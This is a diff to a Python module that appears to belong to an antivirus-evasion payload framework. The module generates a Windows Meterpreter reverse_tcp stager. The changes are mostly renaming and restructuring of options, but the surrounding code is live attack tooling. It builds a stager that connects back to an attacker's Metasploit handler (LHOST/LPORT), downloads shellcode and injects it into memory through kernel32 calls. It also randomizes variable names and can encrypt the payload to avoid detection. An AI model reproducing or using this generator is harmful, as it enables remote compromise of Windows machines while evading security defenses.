@@ -13,23 +13,27 @@ from datetime import timedelta
 from modules.common.pythonpayload import PythonPayload
 
 class Payload(PythonPayload):
-    
+
     def __init__(self):
+        # pull in shared options
         PythonPayload.__init__(self)
+
         # required options
         self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
         self.rating = "Excellent"
-        
+
         # optional
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options["LHOST"] = ["", "IP of the metasploit handler"]
-        self.required_options["LPORT"] = ["4444", "Port of the metasploit handler"]
-        self.required_options["expire_payload"] = ["X", "Optional: Payloads expire after \"X\" days"]
-        
-        
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"],
+                                    "LHOST"          : ["", "IP of the Metasploit handler"],
+                                    "LPORT"          : ["4444", "Port of the Metasploit handler"],
+                                }
+        self.required_options.update(self.required_python_options)
+
     def generate(self):
         self._validateArchitecture()
-        
+
         # randomize all of the variable names used
         shellCodeName = helpers.randomString()
         socketName = helpers.randomString()
@@ -45,8 +49,8 @@ class Payload(PythonPayload):
         shellcodeBufName = helpers.randomString()
         fpName = helpers.randomString()
         tempCBuffer = helpers.randomString()
-        
-        
+
+
         payloadCode = "import struct, socket, binascii, ctypes, random, time\n"
 
         # socket and shellcode variables that need to be kept global
@@ -92,7 +96,7 @@ class Payload(PythonPayload):
         payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n"
 
         # set up expiration options if specified
-        if self.required_options["expire_payload"][0].lower() == "x":
+        if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
             # download the stager
             payloadCode += "%s = %s()\n" %(shellCodeName, getDataMethodName)
             # inject what we grabbed
@@ -100,8 +104,8 @@ class Payload(PythonPayload):
         else:
             # Get our current date and add number of days to the date
             todaysdate = date.today()
-            expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
-                
+            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
+
             randToday = helpers.randomString()
             randExpire = helpers.randomString()
 
@@ -116,7 +120,7 @@ class Payload(PythonPayload):
             payloadCode += "\t%s(%s)\n" % (injectMethodName,shellCodeName)
 
 
-        if self.required_options["use_pyherion"][0].lower() == "y":
+        if self.required_options["USE_PYHERION"][0].lower() == "y":
             payloadCode = encryption.pyherion(payloadCode)
 
         return payloadCode
